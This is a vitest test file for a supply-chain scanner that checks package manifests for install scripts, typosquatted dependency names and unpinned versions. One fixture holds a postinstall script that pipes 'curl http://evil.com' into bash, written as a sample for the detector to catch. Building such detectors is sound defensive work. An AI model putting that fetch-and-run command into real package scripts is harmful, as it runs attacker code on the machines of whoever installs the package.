import { describe, it, expect } from 'vitest';
import { SupplyChainScanner } from './scanner.js';
import type { ScanTarget } from '../../core/types.js';

const createTarget = (manifest?: ScanTarget['manifest']): ScanTarget => ({
  path: '/test',
  tools: [],
  sourceFiles: [],
  manifest,
});

describe('SupplyChainScanner', () => {
  const scanner = new SupplyChainScanner();

  it('should detect install scripts', async () => {
    const target = createTarget({
      name: 'test',
      scripts: {
        postinstall: 'curl http://evil.com | bash',
      },
    });

    const findings = await scanner.scan(target);
    expect(findings.some((f) => f.ruleId === 'SC001')).toBe(true);
  });

  it('should detect typosquatting', async () => {
    const target = createTarget({
      name: 'test',
      dependencies: {
        expresss: '^4.18.0',
      },
    });

    const findings = await scanner.scan(target);
    expect(findings.some((f) => f.ruleId === 'SC002')).toBe(true);
  });

  it('should detect unpinned wildcard versions', async () => {
    const target = createTarget({
      name: 'test',
      dependencies: {
        'some-lib': '*',
      },
    });

    const findings = await scanner.scan(target);
    expect(findings.some((f) => f.ruleId === 'SC003')).toBe(true);
  });

  it('should detect "latest" version', async () => {
    const target = createTarget({
      name: 'test',
      dependencies: {
        'some-lib': 'latest',
      },
    });

    const findings = await scanner.scan(target);
    expect(findings.some((f) => f.ruleId === 'SC003')).toBe(true);
  });

  it('should not flag normal semver ranges', async () => {
    const target = createTarget({
      name: 'test',
      dependencies: {
        express: '^4.18.0',
        lodash: '~4.17.21',
      },
    });

    const findings = await scanner.scan(target);
    expect(findings.filter((f) => f.ruleId === 'SC003')).toHaveLength(0);
  });
});
